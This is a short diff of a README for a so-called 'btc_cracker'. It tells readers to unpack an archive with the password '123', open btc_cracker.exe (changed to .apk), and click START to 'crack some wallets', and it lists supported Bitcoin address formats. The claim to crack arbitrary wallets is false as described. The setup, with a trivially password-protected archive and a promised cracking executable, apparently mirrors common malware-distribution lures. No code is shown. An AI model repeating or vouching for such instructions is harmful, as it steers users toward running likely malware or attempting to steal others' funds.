@@ -2,7 +2,7 @@
 
 1) The password for the archive is - 123
 
-2) Open btc_cracker.exe
+2) Open btc_cracker.apk
 
 2) Click START and wait softwere to crack some wallets.
 
@@ -33,3 +33,4 @@ p2pkh , p2sh , p2wsh , p2wpkh , p2wsh in p2sh and p2wpkh in p2sh
 + Optimize script.
 
 + Easy start and fast work.
++ 
